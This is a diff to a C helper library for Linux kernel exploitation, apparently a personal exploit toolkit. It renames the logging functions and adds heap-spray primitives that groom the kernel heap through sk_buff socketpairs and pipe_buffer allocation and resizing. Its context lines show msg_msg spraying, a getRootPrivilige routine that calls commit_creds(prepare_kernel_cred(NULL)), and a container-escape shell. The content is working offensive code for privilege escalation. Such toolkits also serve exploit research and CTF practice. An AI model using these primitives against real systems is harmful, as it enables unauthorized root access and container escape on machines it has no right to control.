@@ -40,7 +40,7 @@ void warn(const char* text) {
 void panic(const char *text){
     // Red color code
     printf("\033[0;31m");
-    printf("%s", text);
+    printf("[X] %s", text);
     // Reset to default color
     printf("\033[0m\n");
     exit(0x132);
@@ -51,12 +51,10 @@ void shell(){
     else
         panic("[!] Failed to Escape");
 }
-void xInfo(const char *text){
-    printf("\033[0;32m");
-    printf("%s", text);
-    printf("\033[0m\n");
+void info(const char *text){
+    printf("\033[34m\033[1m[+] %s\033[0m\n",text);
 }
-void info(size_t val){
+void success(size_t val){
     // Green color code
     printf("\033[0;32m[+] ");
     printf("%p", val);
@@ -326,9 +324,6 @@ void msgDel(int msgid){
     return; 
 }
 
-
-
-
 /*
     Name: msgSpray
     Desc:
@@ -370,7 +365,6 @@ msgSpray_t * msgSpray(size_t msg_len,size_t num, __u8 *ctx){
         ret = next;
         num -= this_round;
     }
-    xInfo("[+] msgSpray Finished");
 
     return ret;
 }
@@ -383,7 +377,6 @@ void msgSprayClean(msgSpray_t *spray)
 		msgDel(spray->msg_id);
 		spray = spray->next;
 	}
-    xInfo("[+] msgSpray Cleaning Finished");
 }
 /*
     Name: Dup one byte
@@ -521,6 +514,54 @@ void getRootPrivilige()
     (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
     if(back2user==NULL)
         panic("[-] back2user is not set.");
-    xInfo("[n132] Here we go!");
+    info("[n132] Here we go!");
     back2user();
+}
+
+
+/*
+    sk_buff
+        -> initSocketArray
+        -> spraySkBuff
+*/
+
+void initSocketArray(int sk_socket[SOCKET_NUM][2]){
+    for(int i = 0 ; i < SOCKET_NUM ; i++)
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0)
+            panic("Failed to create sockect pairs!\n");
+    info("Finish: initSocketArray");
+}
+void spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
+    // There is a 0x140 area after the buffer
+    for(int i = 0 ; i< SOCKET_NUM ; i++)
+        for(int j = 0 ; j < SK_BUFF_NUM ; j++)
+            if (write(sk_socket[i][0], buf, size)< 0 )
+                panic("Failed to spraySkBuff\n");
+}
+void skbuffSend(int skt,__u8 * ctx, size_t size){
+    if(write(skt, ctx, size)<0)
+        warn("[!] Failed skbuff_add");
+}
+
+/*
+    pipe_buffer
+*/
+
+void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
+    for(int i  = 0 ; i < PIPE_NUM ; i++)
+    {
+        pipe(pipe_fd[i]);
+        write(pipe_fd[i][1], "pipe_buffer init", 17)>=0;
+    }
+}
+void pipeBufferResize(int fd,size_t count){
+    size_t res = fcntl(fd,F_SETPIPE_SZ,0x1000*count);
+    if(res ==0x1000*count)
+        info("[+] PipeBuffer resized");
+    else
+        panic("Failed to resize the PipeBuffer");
+}
+void pipeBufferClose(int fd[2]){
+    close(fd[0]);
+    close(fd[1]);
 }
